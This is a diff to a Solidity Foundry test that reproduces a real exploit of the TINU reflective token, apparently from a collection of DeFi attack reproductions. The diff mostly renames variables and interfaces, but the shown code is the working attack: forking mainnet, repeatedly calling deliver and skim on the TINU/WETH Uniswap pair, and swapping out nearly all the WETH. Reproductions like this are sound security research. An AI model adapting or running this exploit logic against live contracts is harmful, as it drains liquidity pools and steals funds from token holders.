@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
 
@@ -14,12 +14,12 @@ import "forge-std/Test.sol";
 // https://twitter.com/libevm/status/1618731761894309889
 
 contract TomInuExploit is Test {
-    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);
 
     IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-    IUniswapV2Pair private constant WETH_TINU = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);
+    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);
 
     function testHack() external {
         vm.createSelectFork("https://eth.llamarpc.com", 16489408);
@@ -54,31 +54,31 @@ contract TomInuExploit is Test {
             type(uint).max
         );
         
-        console.log("%s TINU in pair before deliver", TINU.balanceOf(address(WETH_TINU)) / 1e18);
+        console.log("%s TINU in pair before deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract before deliver", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Delivering-------------");
         
         TINU.deliver(TINU.balanceOf(address(this)));  // give away TINU
 
-        console.log("%s TINU in pair after deliver", TINU.balanceOf(address(WETH_TINU)) / 1e18);
+        console.log("%s TINU in pair after deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after deliver", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Skimming---------------");
         
-        WETH_TINU.skim(address(this));
+        TINU_WETH.skim(address(this));
         
-        console.log("%s TINU in pair after skim", TINU.balanceOf(address(WETH_TINU)) / 1e18);
+        console.log("%s TINU in pair after skim", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after skim", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Delivering-------------");
 
         TINU.deliver(TINU.balanceOf(address(this)));
 
-        console.log("%s TINU in pair after deliver 2", TINU.balanceOf(address(WETH_TINU)) / 1e18);
+        console.log("%s TINU in pair after deliver 2", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after deliver 2", TINU.balanceOf(address(this)) / 1e18);
         // WETH in Pair always = 126
         
-        WETH_TINU.swap(
+        TINU_WETH.swap(
             0,
-            WETH.balanceOf(address(WETH_TINU)) - 0.01 ether,
+            WETH.balanceOf(address(TINU_WETH)) - 0.01 ether,
             address(this),
             ""
         );
@@ -100,7 +100,7 @@ interface reflectiveERC20 {
     function deliver(uint256 tAmount) external;
 }
 
-interface WETH9 {
+interface IWETH {
     function deposit() external payable;
     function transfer(address to, uint256 value) external returns (bool);
     function approve(address guy, uint256 wad) external returns (bool);
